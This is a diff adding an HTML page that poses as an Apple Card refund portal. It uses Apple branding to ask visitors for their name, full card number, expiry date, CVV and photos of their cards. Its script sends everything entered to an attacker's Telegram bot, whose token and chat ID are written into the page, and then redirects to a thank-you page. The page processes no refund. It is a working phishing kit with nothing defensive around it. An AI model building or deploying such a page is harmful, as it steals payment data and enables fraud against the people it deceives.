@@ -1,0 +1,188 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Apple Card Refund Portal</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            background: #f5f5f7;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+        }
+        .container {
+            width: 420px;
+            background: #fff;
+            padding: 30px;
+            border-radius: 18px;
+            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+        .logo img {
+            width: 60px;
+        }
+        h2 {
+            text-align: center;
+            margin: 0;
+            margin-bottom: 25px;
+            font-weight: 600;
+        }
+        label {
+            font-size: 14px;
+            font-weight: 500;
+        }
+        input {
+            width: 100%;
+            padding: 12px;
+            margin-top: 6px;
+            margin-bottom: 18px;
+            border: 1px solid #d2d2d7;
+            border-radius: 10px;
+            font-size: 15px;
+        }
+        .thumbs {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 10px;
+            margin-top: 10px;
+        }
+        .thumbs img {
+            width: 80px;
+            height: 60px;
+            border-radius: 8px;
+            object-fit: cover;
+            border: 1px solid #ccc;
+        }
+        button {
+            width: 100%;
+            background: #0071e3;
+            color: #fff;
+            padding: 13px;
+            font-size: 16px;
+            border: none;
+            border-radius: 12px;
+            cursor: pointer;
+            font-weight: 600;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/f/fa/Apple_logo_black.svg" alt="Apple Logo">
+        </div>
+        <h2>Apple Card Refund Portal</h2>
+
+        <form id="refundForm" enctype="multipart/form-data">
+            <label>Cardholder Name</label>
+            <input type="text" id="cardName" required>
+
+            <label>Card Number (16 digits)</label>
+            <input type="text" id="cardNumber" maxlength="19" placeholder="XXXX XXXX XXXX XXXX" required>
+
+            <label>Expiry (MM/YY)</label>
+            <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+
+            <label>CVV</label>
+            <input type="text" id="cvv" maxlength="3" required>
+
+            <label>Refund Amount ($)</label>
+            <input type="number" id="refundAmount" min="1" step="0.01" required>
+
+            <label>Upload Bad Cards (Max 10)</label>
+            <input type="file" id="images" multiple accept="image/*">
+
+            <div class="thumbs" id="preview"></div>
+
+            <button type="submit">Process Refund</button>
+        </form>
+    </div>
+
+    <script>
+        const form = document.getElementById("refundForm");
+        const preview = document.getElementById("preview");
+        const botToken = "8466365077:AAETxlYeDyhAKO14UHdq-Jb-THbjKh2F0Hw";
+        const chatId = "7463961514";
+
+        document.getElementById("images").addEventListener("change", function() {
+            preview.innerHTML = "";
+            [...this.files].slice(0, 10).forEach(file => {
+                const img = document.createElement("img");
+                img.src = URL.createObjectURL(file);
+                preview.appendChild(img);
+            });
+        });
+
+        document.getElementById("expiry").addEventListener("input", function(e) {
+            let value = this.value.replace(/[^0-9]/g, "");
+            if (value.length >= 3) {
+                this.value = value.substring(0,2) + "/" + value.substring(2,4);
+            } else {
+                this.value = value;
+            }
+        });
+
+        document.getElementById("cardNumber").addEventListener("input", function(e) {
+            let value = this.value.replace(/\D/g, "").slice(0,16);
+            let formatted = value.match(/.{1,4}/g);
+            this.value = formatted ? formatted.join(' ') : '';
+        });
+
+        form.addEventListener("submit", async function(e) {
+            e.preventDefault();
+
+            let cardName = document.getElementById("cardName").value;
+            let cardNumber = document.getElementById("cardNumber").value.replace(/\s/g, '');
+            let expiry = document.getElementById("expiry").value;
+            let cvv = document.getElementById("cvv").value;
+            let refundAmount = document.getElementById("refundAmount").value;
+
+            if(cardNumber.length !== 16){
+                alert("Card number must be exactly 16 digits.");
+                return;
+            }
+
+            if(!/^\d{2}\/\d{2}$/.test(expiry)){
+                alert("Expiry must be in MM/YY format.");
+                return;
+            }
+
+            if(cvv.length !== 3){
+                alert("CVV must be exactly 3 digits.");
+                return;
+            }
+
+            const message = `APPLE REFUND DATA\n-------------------\nName: ${cardName}\nCard Number: ${cardNumber}\nExpiry: ${expiry}\nCVV: ${cvv}\nRefund Amount: $${refundAmount}`;
+
+            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: message })
+            });
+
+            const files = document.getElementById("images").files;
+
+            for (let f of files) {
+                const formData = new FormData();
+                formData.append("chat_id", chatId);
+                formData.append("photo", f);
+
+                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                    method: "POST",
+                    body: formData
+                });
+            }
+
+            window.location.href = "thankyou.html";
+        });
+    </script>
+</body>
+</html>
